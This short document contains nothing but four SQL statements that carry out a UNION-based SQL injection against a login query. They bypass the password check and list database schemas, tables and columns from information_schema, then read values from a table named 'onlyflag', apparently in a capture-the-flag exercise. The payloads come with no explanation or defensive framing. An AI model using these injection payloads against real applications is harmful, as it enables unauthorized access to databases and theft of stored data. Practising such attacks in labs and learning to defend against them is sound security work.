SELECT * FROM users WHERE uid='admin' union select 1,2,3,4-- -' and upw='anything';
SELECT * FROM users WHERE uid='admin' union select 1,table_schema,3,4 from information_schema.tables-- -' and upw='anything';
SELECT * FROM users WHERE uid='admin' union select 1,table_name,3,column_name from information_schema.columns-- -' and upw='anything';
SELECT * FROM users WHERE uid='admin' union select svalue,sflag,3,sclose from onlyflag-- -' and upw='anything';